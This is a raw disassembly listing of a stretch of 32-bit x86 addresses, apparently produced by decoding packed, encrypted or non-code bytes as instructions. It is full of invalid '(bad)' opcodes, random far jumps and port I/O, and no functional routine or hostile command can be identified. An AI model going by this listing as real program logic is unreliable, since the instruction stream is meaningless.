  4163ad:	scas   al,BYTE PTR es:[edi]
  4163ae:	push   ecx
  4163af:	mov    ecx,0x5ee7447b
  4163b4:	mov    bl,0xd
  4163b6:	mov    eax,0xde536aa9
  4163bb:	lods   al,BYTE PTR ds:[esi]
  4163bc:	cli    
  4163bd:	data16 mov ch,0x67
  4163c0:	mov    ecx,ss
  4163c2:	lods   al,BYTE PTR ds:[esi]
  4163c3:	push   edx
  4163c4:	pop    edx
  4163c5:	mov    esp,0xb1c735dd
  4163ca:	xor    al,0x9f
  4163cc:	cs icebp 
  4163ce:	ds je  0x4163e7
  4163d1:	aas    
  4163d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d3:	jae    0x4163fd
  4163d5:	rcr    al,1
  4163d7:	xchg   edx,eax
  4163d8:	ds mov ah,0x7d
  4163db:	(bad)  
  4163dc:	outs   dx,BYTE PTR ds:[esi]
  4163dd:	add    BYTE PTR [edi-0x2d],0xa1
  4163e1:	leave  
  4163e2:	dec    eax
  4163e3:	and    bh,bh
  4163e5:	(bad)  
  4163e6:	(bad)  
  4163e7:	add    al,0xb9
  4163e9:	and    dl,BYTE PTR [edx+0x33]
  4163ec:	(bad)  
  4163ed:	jns    0x416408
  4163ef:	into   
  4163f0:	pop    edx
  4163f1:	sub    ecx,DWORD PTR [ebx-0x11]
  4163f4:	std    
  4163f5:	pop    DWORD PTR [edx]
  4163f7:	int    0xf
  4163f9:	loopne 0x4163b5
  4163fb:	gs xchg esi,eax
  4163fd:	clc    
  4163fe:	push   ss
  4163ff:	cli    
  416400:	push   ss
  416401:	(bad)  
  416402:	cld    
  416403:	push   ds
  416404:	and    BYTE PTR [ebx+0x687a865c],dh
  41640a:	les    edi,FWORD PTR [eax]
  41640c:	aam    0x3c
  41640e:	in     al,dx
  41640f:	inc    ebx
  416410:	mov    ebp,0xde2223e7
  416415:	mov    esi,DWORD PTR [ebx-0x54]
  416418:	cli    
  416419:	or     DWORD PTR [edx+edi*4-0x75],eax
  41641d:	aad    0x1d
  41641f:	mov    edi,0x534be423
  416424:	mov    ebp,0xf07ac8c0
  416429:	add    bh,bh
  41642b:	cmp    BYTE PTR [eax],dl
  41642d:	add    edi,DWORD PTR [eax+0x5d685d32]
  416433:	test   BYTE PTR [ebx+eiz*4],al
  416436:	mov    bl,0xd
  416438:	and    eax,0x709c3ef3
  41643d:	fidivr DWORD PTR [ecx+0x1f4e0491]
  416443:	and    edx,DWORD PTR [ebx]
  416445:	push   es
  416446:	mov    eax,ds:0x5f3bce
  41644b:	cmp    al,cl
  41644d:	rol    BYTE PTR [edi-0x5006951f],0xc6
  416454:	in     al,dx
  416455:	inc    esi
  416456:	je     0x41648b
  416458:	ja     0x41646e
  41645a:	std    
  41645b:	cmp    eax,0x54e0c876
  416460:	push   edi
  416461:	xor    esp,DWORD PTR [esi+0x19ac9c1e]
  416467:	sbb    eax,edi
  416469:	lahf   
  41646a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41646b:	adc    eax,0x10ab6d40
  416470:	fnstcw WORD PTR [ecx+0x26deb6f5]
  416476:	fadd   DWORD PTR [edi]
  416478:	jle    0x416403
  41647a:	xchg   DWORD PTR [eax+ebp*2+0x8],esi
  41647e:	xchg   edi,eax
  41647f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416480:	fisub  DWORD PTR ss:[eax-0x7]
  416484:	stos   BYTE PTR es:[edi],al
  416485:	or     eax,0xe913b92d
  41648a:	xchg   esp,eax
  41648b:	pop    esi
  41648c:	inc    edi
  41648d:	imul   ebp,DWORD PTR [ecx-0x62],0xf4b6f1fc
  416494:	jg     0x41650e
  416496:	je     0x416453
  416498:	inc    ecx
  416499:	mov    cl,BYTE PTR [edx]
  41649b:	mov    gs,WORD PTR [edi-0xd]
  41649e:	xlat   BYTE PTR ds:[ebx]
  41649f:	nop
  4164a0:	pushf  
  4164a1:	pop    ecx
  4164a2:	retf   
  4164a3:	arpl   ax,bx
  4164a5:	xchg   BYTE PTR [ebp-0x614ef0f1],cl
  4164ab:	lds    esp,FWORD PTR [ecx-0x161104f1]
  4164b1:	jbe    0x416529
  4164b3:	pusha  
  4164b4:	rcr    dl,1
  4164b6:	fist   WORD PTR [edx+0x1bfb9336]
  4164bc:	stos   DWORD PTR es:[edi],eax
  4164bd:	ss jecxz 0x4164e6
  4164c0:	cwde   
  4164c1:	test   al,0x6a
  4164c3:	(bad)
  4164c6:	sub    eax,0xda7d4a8b
  4164cb:	mov    DWORD PTR [ebp+0x32cef0fd],esi
  4164d1:	xor    DWORD PTR [eax],esp
  4164d3:	(bad)  
  4164d4:	and    dh,al
  4164d6:	sbb    dh,BYTE PTR [ecx]
  4164d8:	test   eax,0x758d226a
  4164dd:	xor    DWORD PTR [ebx-0x4d3792aa],ecx
  4164e3:	pusha  
  4164e4:	sub    DWORD PTR [esi],edi
  4164e6:	mov    al,ds:0xaae44b17
  4164eb:	jg     0x41650e
  4164ed:	push   es
  4164ee:	xor    DWORD PTR [esi-0x1a],esp
  4164f1:	data16 lock cmp bl,BYTE PTR [edi-0x589f83e2]
  4164f9:	daa    
  4164fa:	and    al,0x2c
  4164fc:	adc    dh,cl
  4164fe:	sub    bh,BYTE PTR [edi]
  416500:	js     0x416548
  416502:	or     eax,0x5e2eb516
  416507:	nop
  416508:	lock inc ebp
  41650a:	ja     0x4164ae
  41650c:	adc    bh,BYTE PTR [ecx+0x24]
  41650f:	dec    edx
  416510:	add    cl,BYTE PTR [eax+0x12b1d285]
  416516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416517:	push   0x71afd8b0
  41651c:	mov    dh,0xd4
  41651e:	sbb    al,0xf2
  416520:	call   0x4db41dbb
  416525:	lods   al,BYTE PTR es:[esi]
  416527:	push   ecx
  416528:	sbb    eax,0xfdc4e21e
  41652d:	dec    ebx
  41652e:	mov    es,esi
  416530:	mov    ebx,0x62261bd2
  416535:	adc    edi,DWORD PTR [eax+0x7a764e18]
  41653b:	jo     0x4164e0
  41653d:	pop    ds
  41653e:	in     al,dx
  41653f:	ja     0x416568
  416541:	push   esi
  416542:	(bad)  
  416544:	or     DWORD PTR [esi],edx
  416546:	bsr    edx,DWORD PTR [edi+0x6e]
  41654a:	inc    ecx
  41654b:	jne    0x4164fb
  41654d:	add    DWORD PTR [ebx],ebx
  41654f:	sbb    BYTE PTR [ecx+0x21dada5b],dl
  416555:	sbb    BYTE PTR [edx+0x18c0e11f],cl
  41655b:	jmp    0x7cd5:0x4d8196c3
  416562:	pop    edx
  416563:	addr16 retf 
  416565:	xor    BYTE PTR [edx],al
  416567:	xor    al,0xab
  416569:	push   ds
  41656a:	jecxz  0x41652c
  41656c:	sub    DWORD PTR [esi+0x77896a8d],ecx
  416572:	retf   0xbbc9
  416575:	stos   DWORD PTR es:[edi],eax
  416576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416577:	adc    ebp,DWORD PTR [edi+0x34]
  41657a:	rcr    BYTE PTR [edx+0x4],cl
  41657d:	inc    eax
  41657e:	pop    ss
  41657f:	or     dl,BYTE PTR [eax-0x3f]
  416582:	test   eax,0xeac472a6
  416587:	nop
  416588:	lods   al,BYTE PTR ds:[esi]
  416589:	inc    ebp
  41658a:	imul   bl
  41658c:	stos   BYTE PTR es:[edi],al
  41658d:	call   0xb9fedd85
  416592:	sbb    BYTE PTR [edx-0xd66ac40],dh
  416598:	push   edi
  416599:	gs mov gs,eax
  41659c:	aam    0x67
  41659e:	inc    esi
  41659f:	rcl    BYTE PTR [ecx+esi*4-0x68],cl
  4165a3:	jg     0x41652d
  4165a5:	popf   
  4165a6:	ret    0xc482
  4165a9:	sbb    ch,BYTE PTR [ecx-0xe5f1fef]
  4165af:	xchg   ecx,eax
  4165b0:	rol    esi,0x49
  4165b3:	cli    
  4165b4:	add    eax,0x5bfb7
  4165b9:	push   0x1f
  4165bb:	ret    0x652
  4165be:	xchg   BYTE PTR [ebp+0x1],cl
  4165c1:	jb     0x4165ef
  4165c3:	lock mov cl,0xdb
  4165c6:	mov    edi,0xdf417800
  4165cb:	popf   
  4165cc:	scas   al,BYTE PTR es:[edi]
  4165cd:	adc    edi,DWORD PTR [ebp-0x4e]
  4165d0:	pop    es
  4165d1:	(bad)  
  4165d2:	dec    BYTE PTR [ebp-0x18c1765c]
  4165d8:	pop    ecx
  4165d9:	pop    ebp
  4165da:	add    esp,ebp
  4165dc:	out    dx,al
  4165dd:	xor    dh,ah
  4165df:	data16 mov al,ds:0xa879f6f8
  4165e5:	dec    edi
  4165e6:	or     DWORD PTR [eax],0x12e6b556
  4165ec:	mov    eax,ds:0xbda733a9
  4165f1:	outs   dx,BYTE PTR ds:[esi]
  4165f2:	or     al,0x5e
  4165f4:	sub    esp,esp
  4165f6:	mov    ebp,0xda5e3ebf
  4165fb:	or     eax,DWORD PTR [eax+0x2d7526ef]
  416601:	or     ecx,ebx
  416603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416604:	adc    esi,DWORD PTR [ebp-0x2f860e33]
  41660a:	sub    bl,BYTE PTR [edi]
  41660c:	and    DWORD PTR [ecx-0x56e91fbc],edx
  416612:	retf   0xa06
  416615:	mov    bl,0x1d
  416617:	in     al,0x89
  416619:	cmp    al,0x61
  41661b:	mov    esi,0x1d2b806
  416620:	dec    esp
  416621:	push   ss
  416622:	in     eax,dx
  416623:	sbb    ecx,esp
  416625:	out    dx,eax
  416626:	int3   
  416627:	mov    dh,0x92
  416629:	xchg   edx,eax
  41662a:	(bad)  
  41662b:	(bad)  
  41662d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41662e:	repz mov WORD PTR [ebx-0x42542114],cs
  416635:	repz arpl WORD PTR [eax-0x2c],di
  416639:	fnsave [ebx+0x18]
  41663c:	es aas 
  41663e:	and    edi,ebx
  416640:	jno    0x4165cc
  416642:	xchg   ebp,eax
  416643:	or     edi,DWORD PTR [ebx]
  416645:	cmc    
  416646:	pushf  
  416647:	pop    edx
  416648:	mov    esi,ebp
  41664a:	xchg   edx,eax
  41664b:	lock push 0x91e6fb13
  416651:	mov    al,0x6c
  416653:	pop    esi
  416654:	inc    ebx
  416655:	pop    ebp
  416656:	cmp    DWORD PTR [ebp+0x78],eax
  416659:	daa    
  41665a:	pop    edi
  41665b:	xchg   edx,eax
  41665c:	adc    al,0xf0
  41665e:	jno    0x416662
  416660:	addr16 ss ret 
  416663:	xor    ecx,DWORD PTR [esi+ebp*2]
  416666:	mov    al,0x57
  416668:	and    esp,DWORD PTR [ebx-0x61ab067]
  41666e:	mov    ebx,0x686fff3c
  416673:	sub    DWORD PTR [esi],0x1a
  416676:	add    BYTE PTR [ebx+0x31fc8da6],0x43
  41667d:	mov    edi,0xc3cdb81
  416682:	adc    bl,al
  416684:	dec    ebx
  416685:	mov    ch,0x76
  416687:	daa    
  416688:	iret   
  416689:	fcom   DWORD PTR [ecx]
  41668b:	inc    ebx
  41668c:	sub    BYTE PTR [esi],dh
  41668e:	sub    DWORD PTR [ebp-0x6f],edi
  416691:	xor    DWORD PTR [esi-0x32d5c457],eax
  416697:	pop    ds
  416698:	int3   
  416699:	push   es
  41669a:	cdq    
  41669b:	add    cl,BYTE PTR [ebp-0x1b]
  41669e:	mov    cl,0x48
  4166a0:	push   ss
  4166a1:	fdiv   DWORD PTR [ebx+eax*2+0x40093a55]
  4166a8:	cli    
  4166a9:	pop    esi
  4166aa:	xor    esp,ebp
  4166ac:	xchg   edx,eax
  4166ad:	xor    ch,BYTE PTR [ecx+0x15a61d63]
  4166b3:	jnp    0x4166b2
  4166b5:	sbb    al,0xc4
  4166b7:	mov    eax,0x165e120c
  4166bc:	test   eax,0x1754a832
  4166c1:	or     eax,0xeb16baf4
  4166c6:	ret    
  4166c7:	pop    ebp
  4166c8:	and    eax,0xedb24005
  4166cd:	outs   dx,BYTE PTR ds:[esi]
  4166ce:	fs push ebp
  4166d0:	pop    ecx
  4166d1:	jno    0x4166ac
  4166d3:	mov    dl,0xe3
  4166d5:	shl    DWORD PTR [ebx],1
  4166d7:	jb     0x416733
  4166d9:	xchg   edx,eax
  4166da:	mov    ds:0xae78cde0,al
  4166df:	pop    esp
  4166e0:	cwde   
  4166e1:	push   edx
  4166e2:	enter  0x4897,0xa2
  4166e6:	test   al,0xc
  4166e8:	cdq    
  4166e9:	jecxz  0x4166fb
  4166eb:	mov    ebp,0x362d431a
  4166f0:	add    eax,0x9d45e22d
  4166f5:	add    BYTE PTR [esi+0x78],cl
  4166f8:	xor    DWORD PTR [esi-0x17],0xffffffe9
  4166fc:	mov    al,0x81
  4166fe:	das    
  4166ff:	sbb    al,0x48
  416701:	rcl    DWORD PTR [ebp+0x3d],1
  416704:	pop    ecx
  416705:	shr    BYTE PTR [edx-0x3d5ad398],cl
  41670b:	sub    eax,0xa214db01
  416710:	add    al,BYTE PTR [esi-0x95ef773]
  416716:	pop    edx
  416717:	lods   al,BYTE PTR ds:[esi]
  416718:	adc    al,0xb
  41671a:	and    ebx,DWORD PTR [ebx-0x224d479e]
  416720:	test   esp,eax
  416722:	dec    ebp
  416723:	mov    al,0x64
  416725:	mov    ds:0xe33c116d,eax
  41672a:	loope  0x41677f
  41672c:	lahf   
  41672d:	pop    ebp
  41672e:	and    al,0x44
  416730:	clc    
  416731:	gs test eax,0xa75fbc8e
  416737:	inc    esi
  416738:	pop    ss
  416739:	pop    edx
  41673a:	gs jns 0x416763
  41673d:	inc    esp
  41673e:	cpuid  
  416740:	push   edi
  416741:	sub    eax,DWORD PTR [ecx]
  416743:	inc    ebx
  416744:	test   BYTE PTR [edx-0x16e5e91c],bl
  41674a:	int3   
  41674b:	jb     0x416713
  41674d:	in     eax,dx
  41674e:	(bad)  
  41674f:	daa    
  416750:	jl     0x416770
  416752:	sub    BYTE PTR [edi+0x145e3754],cl
  416758:	sbb    edx,DWORD PTR [edi+0x4763940e]
  41675e:	and    BYTE PTR [ebx+edx*4-0xef93230],cl
  416765:	xchg   esi,eax
  416766:	push   0x40d7c600
  41676b:	test   al,0x21
  41676d:	push   ebp
  41676e:	cld    
  41676f:	lea    ebx,[eax+0x3c]
  416772:	inc    esi
  416773:	sahf   
  416774:	mov    dh,0xc
  416776:	(bad)  
  416777:	cmp    DWORD PTR [edi+0x6fa28c4a],esi
  41677d:	(bad)  
  41677e:	xchg   ebx,eax
  41677f:	jecxz  0x416779
  416781:	(bad)  
  416782:	mov    al,0x42
  416784:	jp     0x41676e
  416786:	loopne 0x4167d5
  416788:	add    eax,0xdf74ba48
  41678d:	pop    edx
  41678e:	mov    esi,?
  416790:	mov    esp,0x5445a3ae
  416795:	inc    ebx
  416796:	shr    DWORD PTR [ebp+0x69],cl
  416799:	and    ebp,DWORD PTR [ebx]
  41679b:	jmp    0x41676e
  41679d:	shl    al,1
  41679f:	adc    DWORD PTR [ebx],ecx
  4167a1:	jl     0x416772
  4167a3:	jne    0x4167df
  4167a5:	rcl    ecx,1
  4167a7:	dec    ebp
  4167a8:	aad    0x98
  4167aa:	mov    esi,0x4e780b83
  4167af:	pop    ebp
  4167b0:	retf   
  4167b1:	das    
  4167b2:	and    cl,BYTE PTR [esi+0x25]
  4167b5:	aad    0x64
  4167b7:	leave  
  4167b8:	pop    esp
  4167b9:	fiadd  DWORD PTR [ecx+0x27d4b382]
  4167bf:	jns    0x4167c2
  4167c1:	cld    
  4167c2:	aaa    
  4167c3:	cdq    
  4167c4:	mov    esp,0x247be870
  4167c9:	cs mov esp,0x3f88fe10
  4167cf:	sbb    cl,ch
  4167d1:	lock xor BYTE PTR [ecx],ah
  4167d4:	adc    cl,BYTE PTR [edi]
  4167d6:	lahf   
  4167d7:	cmp    BYTE PTR [edi-0x41333d3a],bl
  4167dd:	sub    eax,0xf861ddac
  4167e2:	stos   BYTE PTR es:[edi],al
  4167e3:	retf   0x126b
  4167e6:	xchg   edi,eax
  4167e7:	mov    BYTE PTR [ebp+0x1b],0xf0
  4167eb:	(bad)  
  4167ed:	scas   al,BYTE PTR es:[edi]
  4167ee:	fidivr DWORD PTR [eax]
  4167f0:	sub    edi,DWORD PTR [ecx]
  4167f2:	retf   0x48ab
  4167f5:	dec    ecx
  4167f6:	ins    BYTE PTR es:[edi],dx
  4167f7:	arpl   WORD PTR [edi-0x67],si
  4167fa:	(bad)  
  4167fb:	in     eax,dx
  4167fc:	repz into 
  4167fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167ff:	outs   dx,BYTE PTR ds:[esi]
  416800:	(bad)  
  416801:	fmul   QWORD PTR [esi]
  416803:	ds mov dh,0x8b
  416806:	jnp    0x416811
  416808:	cmp    BYTE PTR [edi-0xeccfbd6],ch
  41680e:	xchg   ebp,eax
  41680f:	inc    ecx
  416810:	in     al,dx
  416811:	imul   ebx,ecx,0x57
  416814:	ja     0x41680b
  416816:	mov    ds:0x4789de9c,al
  41681b:	xchg   ebp,eax
  41681c:	xor    DWORD PTR [eax-0x59],esp
  41681f:	pop    esp
  416820:	pushf  
  416821:	pop    esp
  416822:	sbb    al,al
  416824:	repz pop edx
  416826:	(bad)  
  416827:	push   DWORD PTR [eax-0x77]
  41682a:	add    eax,0xa515fa9c
  41682f:	cs addr16 xchg esp,eax
  416832:	shr    DWORD PTR [ebx-0x3101c7e7],1
  416838:	jecxz  0x41689f
  41683a:	inc    edx
  41683b:	or     esi,eax
  41683d:	or     eax,eax
  41683f:	cmp    al,BYTE PTR [ebx+ebx*1+0x42]
  416843:	and    al,0xbd
  416845:	enter  0xbc3,0x89
  416849:	push   eax
  41684a:	popa   
  41684b:	es popf 
  41684d:	push   ds
  41684e:	inc    eax
  41684f:	push   edx
  416850:	out    dx,eax
  416851:	aaa    
  416852:	shr    DWORD PTR [esi+0x26],1
  416855:	minps  xmm4,xmm2
  416858:	(bad)  
  416859:	sbb    eax,0x8ace0867
  41685e:	dec    esp
  41685f:	rcl    DWORD PTR [ebx-0x4cfaf80d],cl
  416865:	adc    ch,bh
  416867:	lahf   
  416868:	cmc    
  416869:	xchg   edi,eax
  41686a:	mov    bl,0x64
  41686c:	outs   dx,DWORD PTR ds:[esi]
  41686d:	mov    edi,0xea5d263
  416872:	and    al,0xa1
  416874:	lahf   
  416875:	dec    esp
  416876:	gs jmp 0xfc69e032
  41687c:	aaa    
  41687d:	div    DWORD PTR [ebp-0x41]
  416880:	in     eax,dx
  416881:	mov    al,ds:0x95c6f2b8
  416886:	and    eax,0x55226f1e
  41688b:	bound  ebp,QWORD PTR gs:[edi-0x72e56ab0]
  416892:	xor    eax,0x61fd20ae
  416897:	adc    ch,BYTE PTR [eax+0x6]
  41689a:	ret    
  41689b:	sub    BYTE PTR [esi+0x402bdd6a],ch
  4168a1:	into   
  4168a2:	out    0x64,al
  4168a4:	enter  0x4c1e,0xb4
  4168a8:	retf   
  4168a9:	inc    eax
  4168aa:	rol    bh,0xa8
  4168ad:	sub    dl,BYTE PTR [ebx]
  4168af:	xor    DWORD PTR [eax+0x51],ecx
  4168b2:	mov    al,ds:0xbcab4cb8
  4168b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168b8:	inc    ebp
  4168b9:	jno    0x4168db
  4168bb:	inc    ecx
  4168bc:	(bad)  
  4168bd:	push   edi
  4168be:	mov    bh,0x62
  4168c0:	lods   al,BYTE PTR ds:[esi]
  4168c1:	push   cs
  4168c2:	lods   al,BYTE PTR ds:[esi]
  4168c3:	xchg   ebx,eax
  4168c4:	adc    bl,BYTE PTR [edi-0x6cc9e3ef]
  4168ca:	leave  
  4168cb:	enter  0x7dbf,0x74
  4168cf:	sar    edx,1
  4168d1:	jmp    0x2c3a:0xf89fc790
  4168d8:	js     0x4168bb
  4168da:	test   BYTE PTR [edx+0x68ce6fd7],ch
  4168e0:	jne    0x4168a0
  4168e2:	fistp  QWORD PTR [ebp+0x3cc967d]
  4168e8:	fwait
  4168e9:	aaa    
  4168ea:	mov    cl,0xe7
  4168ec:	(bad)  
  4168ee:	lods   eax,DWORD PTR ds:[esi]
  4168ef:	imul   edx,DWORD PTR [esi+esi*1+0xf591234],0x7f
  4168f7:	fmulp  st(4),st
  4168f9:	stos   BYTE PTR es:[edi],al
  4168fa:	loope  0x4168d7
  4168fc:	and    BYTE PTR [eax+eiz*2-0x3f],bh
  416900:	bound  ecx,QWORD PTR [edi]
  416902:	inc    esi
  416903:	test   eax,0x80ef7916
  416908:	adc    DWORD PTR [edx+0x77],edx
  41690b:	push   0xbe26cccc
  416910:	inc    ecx
  416911:	in     eax,0xa1
  416913:	push   esi
  416914:	dec    ecx
  416915:	loope  0x416955
  416917:	call   0x5a594f80
  41691c:	fucomip st,st(0)
  41691e:	add    esp,DWORD PTR [ecx-0x5a]
  416921:	jmp    0x4e257b5a
  416926:	inc    eax
  416927:	push   0x48
  416929:	jl     0x416900
  41692b:	and    esp,edx
  41692d:	jmp    0x416998
  41692f:	and    cl,BYTE PTR [esi+esi*1]
  416932:	mov    ds:0x27dc056b,al
  416937:	pop    es
  416938:	out    0xc9,eax
  41693a:	pushf  
  41693b:	pushf  
  41693c:	and    bh,BYTE PTR ds:0x4ac8c7ca
  416942:	mov    al,0x32
  416944:	aas    
  416945:	js     0x4168d6
  416947:	iret   
  416948:	out    dx,al
  416949:	mov    esi,0xe6a59bdf
  41694e:	cmp    edi,DWORD PTR [edx-0x3b]
  416951:	push   cs
  416952:	cmp    eax,0x3dd671ac
  416957:	adc    DWORD PTR [edi-0x39],eax
  41695a:	sar    bl,0xbc
  41695d:	call   0xc8bc:0x5a56751f
  416964:	mov    esp,0xef9798a9
  416969:	mov    ah,0xe
  41696b:	mov    al,0x4b
  41696d:	xor    ebx,DWORD PTR [edx+0x76]
  416970:	mov    edx,0xc4c09105
  416975:	dec    esi
  416976:	in     eax,dx
  416977:	mov    al,ds:0xa0dabf54
  41697c:	lea    edi,[ebx]
  41697e:	jb     0x4169fc
  416980:	neg    BYTE PTR [eax-0x33]
  416983:	inc    ch
  416985:	mov    esp,DWORD PTR [ebp+0x5ae023b8]
  41698b:	mov    eax,ds:0x17b6307
  416990:	icebp  
  416991:	inc    ebp
  416992:	xchg   DWORD PTR [esi-0x4b],ebp
  416995:	test   eax,0xb68fb3f1
  41699a:	pop    ecx
  41699b:	or     DWORD PTR [edi+esi*8+0x59],ebp
  41699f:	int    0x23
  4169a1:	nop
  4169a2:	imul   esi,DWORD PTR [eax-0x11c10842],0xffffffef
  4169a9:	int3   
  4169aa:	or     eax,0x5e5e2d03
  4169af:	xor    dh,BYTE PTR [ecx+0x20ca7a75]
  4169b5:	inc    ebx
  4169b6:	pop    eax
  4169b7:	xor    ebp,ecx
  4169b9:	adc    BYTE PTR [esi-0x5e45e14c],0x49
  4169c0:	jnp    0x4169ee
  4169c2:	dec    ecx
  4169c3:	imul   esp,esi,0x6efca7fa
  4169c9:	push   edi
  4169ca:	add    eax,DWORD PTR [esi]
  4169cc:	ds sub ecx,DWORD PTR fs:[esi]
  4169d0:	adc    eax,0xea8f46f5
  4169d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169d6:	xchg   ecx,eax
  4169d7:	jnp    0x4169cd
  4169d9:	mov    DWORD PTR [eax-0x3f],0x7cbcd1ad
  4169e0:	mov    al,ds:0x8b9511e8
  4169e5:	mov    eax,ds:0x73368ffa
  4169ea:	adc    eax,0x8b8a8b3e
  4169ef:	mov    eax,ds:0xd3252e76
  4169f4:	inc    edx
  4169f5:	jo     0x416a47
  4169f7:	loop   0x416a1f
  4169f9:	and    eax,0xd85e4870
  4169fe:	sub    eax,0xe021795e
  416a03:	push   edx
  416a04:	dec    edi
  416a05:	or     ch,BYTE PTR [ebx+0x2dfa23d8]
  416a0b:	into   
  416a0c:	dec    ebp
  416a0d:	iret   
  416a0e:	std    
  416a0f:	lods   al,BYTE PTR ds:[esi]
  416a10:	mov    cl,0x70
  416a12:	mul    DWORD PTR [edi]
  416a14:	enter  0xb157,0xf8
  416a18:	repz xlat BYTE PTR ds:[ebx]
  416a1a:	outs   dx,DWORD PTR ds:[esi]
  416a1b:	dec    ebp
  416a1c:	out    dx,al
  416a1d:	sbb    al,0xe9
  416a1f:	add    esi,DWORD PTR [esi+0x27]
  416a22:	push   di
  416a24:	pop    edx
  416a25:	sbb    ecx,esp
  416a27:	ins    DWORD PTR es:[edi],dx
  416a28:	and    bl,0x56
  416a2b:	pop    esi
  416a2c:	out    0x6a,al
  416a2e:	push   esi
  416a2f:	push   eax
  416a30:	out    dx,eax
  416a31:	ins    DWORD PTR es:[edi],dx
  416a32:	or     DWORD PTR [ebx+0x1f],ebp
  416a35:	retf   
  416a36:	adc    eax,0x8fccd4b3
  416a3b:	ffree  st(1)
  416a3d:	push   esi
  416a3e:	imul   BYTE PTR [ebx-0x34]
  416a41:	push   0x155e0bfa
  416a46:	mov    ds:0x1440a53,eax
  416a4b:	mov    bl,0x42
  416a4d:	jmp    0x308:0x22980650
  416a54:	(bad)  
  416a55:	imul   esp,DWORD PTR [ebx-0x2],0x3d469865
  416a5c:	jmp    0xfccb25d7
  416a61:	stos   DWORD PTR es:[edi],eax
  416a62:	ds mov esi,0xf1351fbd
  416a68:	xlat   BYTE PTR ds:[ebx]
  416a69:	xchg   ebx,eax
  416a6a:	jno    0x416a6e
  416a6c:	jl     0x416a95
  416a6e:	lods   eax,DWORD PTR ds:[esi]
  416a6f:	mov    al,ds:0x51b04c32
  416a74:	push   0xf11b571c
  416a79:	cmp    ch,dh
  416a7b:	dec    ebp
  416a7c:	and    ebp,DWORD PTR [ebx+0x6a]
  416a7f:	and    esp,edi
  416a81:	adc    edi,edx
  416a83:	xor    DWORD PTR [ebp+0x34f6b394],0xfffffffc
  416a8a:	int    0x72
  416a8c:	mov    ebp,0x9ecf87fa
  416a91:	(bad)  
  416a93:	clc    
  416a94:	sub    ecx,DWORD PTR [esi+0x6d910520]
  416a9a:	jmp    0xef89cd4a
  416a9f:	cld    
  416aa0:	push   0x46
  416aa2:	mul    esi
  416aa4:	fwait
  416aa5:	imul   ebx,ebp,0xf770c574
  416aab:	mov    ebp,0xa355c703
  416ab0:	test   BYTE PTR [ebx+0x11],dh
  416ab3:	aad    0xc9
  416ab5:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ab7:	enter  0xee39,0xd8
  416abb:	xor    DWORD PTR [esi],esp
  416abd:	int3   
  416abe:	dec    BYTE PTR [ecx+0x2c7bac1b]
  416ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ac5:	loop   0x416b23
  416ac7:	sbb    BYTE PTR [edx+0x78],bl
  416aca:	mov    eax,ds:0x446ece26
  416acf:	inc    eax
  416ad0:	mov    edx,0xc0be2241
  416ad5:	ja     0x416a94
  416ad7:	outs   dx,BYTE PTR ds:[esi]
  416ad8:	and    BYTE PTR [ebx+0x49],bl
  416adb:	popw   es
  416add:	sbb    ebx,ebp
  416adf:	(bad)  
  416ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ae1:	aad    0x24
  416ae3:	or     DWORD PTR [esi],ebx
  416ae5:	xchg   edi,eax
  416ae6:	push   eax
  416ae7:	inc    eax
  416ae8:	call   0x2046:0x45ce1571
  416aef:	mov    edi,0x3fac77f0
  416af4:	adc    al,0x34
  416af6:	push   esi
  416af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416af8:	mov    WORD PTR [ecx],es
  416afa:	pop    ebp
  416afb:	mov    ds:0x48ec915,al
  416b00:	pusha  
  416b01:	lock sub DWORD PTR [ecx+0x1fb6fc13],ebp
  416b08:	out    dx,eax
  416b09:	push   0x58
  416b0b:	jb     0x416b3f
  416b0d:	dec    ebp
  416b0e:	scas   eax,DWORD PTR es:[edi]
  416b0f:	scas   al,BYTE PTR es:[edi]
  416b10:	enter  0x1cd8,0x62
  416b14:	mov    fs,WORD PTR [ebp-0x55]
  416b17:	addr16 dec edx
  416b19:	jp     0x416b36
  416b1b:	out    0xcf,al
  416b1d:	ret    0xf442
  416b20:	sbb    dh,BYTE PTR [esi+0x5856817c]
  416b26:	in     al,0xd5
  416b28:	xor    al,dh
  416b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b2b:	inc    ebx
  416b2c:	pop    edx
  416b2d:	aas    
  416b2e:	cdq    
  416b2f:	out    0x7e,eax
  416b31:	ja     0x416b7c
  416b33:	int3   
  416b34:	push   0x714213d9
  416b39:	xchg   esi,eax
  416b3a:	inc    esp
  416b3b:	xor    edi,DWORD PTR [ecx]
  416b3d:	outs   dx,BYTE PTR ds:[esi]
  416b3e:	gs ds mov edi,0xc78dcb91
  416b45:	cdq    
  416b46:	fdivr  QWORD PTR [esi]
  416b48:	push   edx
  416b49:	sbb    al,0x72
  416b4b:	pushf  
  416b4c:	imul   eax,DWORD PTR [ebp-0x6e],0xcce4f9da
  416b53:	dec    ecx
  416b54:	ror    DWORD PTR [ebp-0x72b2e016],1
  416b5a:	aas    
  416b5b:	(bad)  
  416b5c:	lock add edi,DWORD PTR [edx+0x78]
  416b60:	push   ds
  416b61:	xchg   BYTE PTR [ebp-0x2467192f],bh
  416b67:	xor    DWORD PTR [esi],edi
  416b69:	call   0x77baca6b
  416b6e:	fidivr DWORD PTR [esi+edx*1+0x14e6eac5]
  416b75:	add    ch,ah
  416b77:	lds    eax,FWORD PTR [ecx+0xdfed4f4]
  416b7d:	or     bh,BYTE PTR [esi]
  416b7f:	fdivr  DWORD PTR [eax]
  416b81:	sbb    esp,DWORD PTR [edx+esi*4+0x34d8962b]
  416b88:	xchg   ch,cl
  416b8a:	in     eax,dx
  416b8b:	mov    ch,0x2
  416b8d:	xchg   ebp,eax
  416b8e:	push   0xfffffffb
